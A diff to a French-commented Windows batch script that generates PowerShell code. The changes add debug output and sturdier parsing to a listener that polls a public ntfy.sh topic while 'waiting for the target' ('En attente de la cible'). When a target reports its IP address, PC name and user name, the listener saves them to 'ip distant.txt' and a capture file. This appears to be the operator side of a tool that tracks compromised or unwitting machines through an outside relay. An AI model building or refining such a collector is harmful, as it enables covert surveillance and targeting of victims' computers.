@@ -1612,12 +1612,14 @@ REM --- Construire menu depuis ip distant.txt ---
 set "CAP_PS=%TEMP%\capbld_%RANDOM%.ps1"
 set "CAP_OPTS=%TEMP%\capopts.txt"
 set "CAP_IPS=%TEMP%\capips.txt"
+set "IPDIST_CAP=%~dp0ip distant.txt"
 if exist "%CAP_OPTS%" del /f /q "%CAP_OPTS%"
 if exist "%CAP_IPS%"  del /f /q "%CAP_IPS%"
->>"%CAP_PS%" echo if (-not (Test-Path "ip distant.txt")) { exit 1 }
+>>"%CAP_PS%" echo $f = '%IPDIST_CAP%'
+>>"%CAP_PS%" echo if (-not (Test-Path $f)) { exit 1 }
 >>"%CAP_PS%" echo $seen=@{}; $entries=@()
->>"%CAP_PS%" echo foreach ($l in (Get-Content "ip distant.txt" -EA SilentlyContinue)) {
->>"%CAP_PS%" echo     if ($l -match "IP: ([^\s]+) -- PC: ([^\s]+) -- User: (.+)$") {
+>>"%CAP_PS%" echo foreach ($l in (Get-Content $f -EA SilentlyContinue)) {
+>>"%CAP_PS%" echo     if ($l -match "IP: ([^\s]+)\s+(?:--|\|)\s+PC: ([^\s]+)\s+(?:--|\|)\s+User: (.+?)[\s]*$") {
 >>"%CAP_PS%" echo         $ip=$matches[1]; $pc=$matches[2]; $usr=$matches[3].Trim()
 >>"%CAP_PS%" echo         if (-not $seen[$ip]) { $seen[$ip]=$true; $entries += @{IP=$ip;PC=$pc;USR=$usr} }
 >>"%CAP_PS%" echo     } }
@@ -1937,7 +1939,9 @@ REM --- Attente reception ntfy.sh + sauvegarde ip distant.txt ---
 >> "%PS_NTFY%" echo $topic = '%gemail%'
 >> "%PS_NTFY%" echo $capFile = '%CAPFILE_EM%'
 >> "%PS_NTFY%" echo $logFile = '%IPDIST%'
+>> "%PS_NTFY%" echo Write-Host ("  [D] logFile : " + $logFile) -f DarkGray
 >> "%PS_NTFY%" echo $since = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
+>> "%PS_NTFY%" echo Write-Host ("  [D] since   : " + $since) -f DarkGray
 >> "%PS_NTFY%" echo $sp = @('^|','/','-','\'); $si = 0; $esc = $false; $found = $false
 >> "%PS_NTFY%" echo Write-Host '  [i] En attente de la cible... (ECHAP pour annuler)' -f DarkYellow
 >> "%PS_NTFY%" echo Write-Host ''
@@ -1947,10 +1951,16 @@ REM --- Attente reception ntfy.sh + sauvegarde ip distant.txt ---
 >> "%PS_NTFY%" echo   }
 >> "%PS_NTFY%" echo   try {
 >> "%PS_NTFY%" echo     $r = Invoke-WebRequest "https://ntfy.sh/$topic/json?poll=1&since=$since" -UseBasicParsing -TimeoutSec 5 -EA Stop
->> "%PS_NTFY%" echo     $msgs = ($r.Content -split "`n") ^| Where-Object { $_ -match '"event":"message"' }
->> "%PS_NTFY%" echo     foreach ($m in $msgs) {
->> "%PS_NTFY%" echo       $obj = $m ^| ConvertFrom-Json
->> "%PS_NTFY%" echo       if ($obj.message -match 'IP: ([^\|]+) \| PC: ([^\|]+) \| User: (.+)') {
+>> "%PS_NTFY%" echo     $rb = $r.Content; if ($rb -is [byte[]]) { $ct = [System.Text.Encoding]::UTF8.GetString($rb).Trim() } else { $ct = $rb.Trim() }
+>> "%PS_NTFY%" echo     Write-Host ("`r  [D] raw: " + $ct.Substring(0,[Math]::Min(200,$ct.Length))) -f DarkGray
+>> "%PS_NTFY%" echo     if ($ct.Length -eq 0) { throw 'empty' }
+>> "%PS_NTFY%" echo     $items = @()
+>> "%PS_NTFY%" echo     try { $p = $ct ^| ConvertFrom-Json; $items = @($p) } catch {}
+>> "%PS_NTFY%" echo     if ($items.Count -eq 0) { foreach ($ln in ($ct -split "[\r\n]+" ^| Where-Object { $_.Trim() -ne '' })) { try { $items += ($ln ^| ConvertFrom-Json) } catch {} } }
+>> "%PS_NTFY%" echo     Write-Host ("  [D] items : " + $items.Count) -f DarkGray
+>> "%PS_NTFY%" echo     foreach ($obj in $items) {
+>> "%PS_NTFY%" echo       Write-Host ("  [D] event=" + $obj.event + " msg=" + $obj.message) -f DarkGray
+>> "%PS_NTFY%" echo       if ($obj.event -eq 'message' -and $obj.message -match 'IP: (\S+) .+? PC: (\S+) .+? User: (.+)') {
 >> "%PS_NTFY%" echo         $ip_val=$matches[1].Trim(); $pc_val=$matches[2].Trim(); $usr_val=$matches[3].Trim()
 >> "%PS_NTFY%" echo         $found = $true
 >> "%PS_NTFY%" echo         Write-Host ''
@@ -1960,13 +1970,14 @@ REM --- Attente reception ntfy.sh + sauvegarde ip distant.txt ---
 >> "%PS_NTFY%" echo         Write-Host ("  User : " + $usr_val) -f White
 >> "%PS_NTFY%" echo         Write-Host '  =================================================' -f Red
 >> "%PS_NTFY%" echo         $ts = Get-Date -Format '[dd/MM/yyyy  H:mm:ss,ff]'
->> "%PS_NTFY%" echo         Add-Content $logFile ("$ts [NTFY] IP: $ip_val -- PC: $pc_val -- User: $usr_val ") -Encoding UTF8
->> "%PS_NTFY%" echo         Set-Content $capFile -Value "$ip_val;$pc_val;$usr_val" -Encoding ASCII
->> "%PS_NTFY%" echo         Write-Host '  [->] Sauvegarde dans ip distant.txt' -f Green
+>> "%PS_NTFY%" echo         $line = "$ts [NTFY] IP: $ip_val -- PC: $pc_val -- User: $usr_val "
+>> "%PS_NTFY%" echo         Write-Host ("  [D] Ecriture : " + $line) -f DarkGray
+>> "%PS_NTFY%" echo         try { Add-Content -LiteralPath $logFile -Value $line -Encoding UTF8; Write-Host '  [OK] Sauvegarde ip distant.txt' -f Green } catch { Write-Host ("  [ERR] Add-Content : " + $_) -f Red }
+>> "%PS_NTFY%" echo         try { Set-Content -LiteralPath $capFile -Value "$ip_val;$pc_val;$usr_val" -Encoding ASCII } catch {}
 >> "%PS_NTFY%" echo         break
->> "%PS_NTFY%" echo       }
+>> "%PS_NTFY%" echo       } else { Write-Host '  [D] regex no match' -f DarkGray }
 >> "%PS_NTFY%" echo     }
->> "%PS_NTFY%" echo   } catch {}
+>> "%PS_NTFY%" echo   } catch { Write-Host ("  [ERR] WebRequest : " + $_) -f Red }
 >> "%PS_NTFY%" echo   if (-not $found) {
 >> "%PS_NTFY%" echo     $i = 3
 >> "%PS_NTFY%" echo     while ($i -gt 0) {
